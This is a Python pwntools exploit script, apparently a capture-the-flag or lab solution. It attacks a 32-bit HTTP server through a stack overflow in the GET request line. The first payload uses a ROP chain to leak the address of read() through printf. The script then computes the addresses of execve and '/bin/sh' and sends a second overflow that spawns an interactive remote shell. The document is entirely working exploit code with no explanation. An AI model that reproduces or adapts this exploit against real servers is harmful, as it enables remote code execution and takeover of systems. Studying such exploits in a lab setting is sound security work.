from pwn import *
import struct
import sys

HOST = sys.argv[1]
PORT = sys.argv[2]

conn = remote(HOST, PORT) 

BUFFER_SIZE = 0x8b

payload = b''

payload += b'GET '
payload += b'a'*BUFFER_SIZE

#############THE ROP STACK###########
#METHOD 1: LEAK ADDR OF execve -> COMPUTE ADDR OF "/bin/sh"
payload += struct.pack("<I", 0x8048910) #Go to Printf
payload += struct.pack("<I", 0x08049855) # return to parse_http_request()
payload += struct.pack("<I", 0x804b3cc) #Leak the address of read()

payload += b' HTTP/1.1'

print("[*] 1st Payload : {}".format(payload))

conn.send(payload) #send payload

msg = conn.recv()

print("[*] 1st Returned : {}".format(msg))

read_addr = struct.unpack("<I", msg[:4])[0]
execve_addr = read_addr - 0x25930
bin_sh_addr = read_addr + 0x7769a

print("[*] read address : {}".format(hex(read_addr)))
print("[*] execve address : {}".format(hex(execve_addr)))
print("[*] /bin/sh address : {}".format(hex(bin_sh_addr)))

payload = b'GET '
payload += b'a'*BUFFER_SIZE
payload += struct.pack("<I",execve_addr)
payload += struct.pack("<I", 0xffffffff) #Fake ret addr
payload += struct.pack("<I",bin_sh_addr)
payload += b' HTTP/1.1\n'

print("[*] 2nd Payload : {}".format(payload))

conn.sendline(payload)
conn.interactive()

conn.close()

####################################
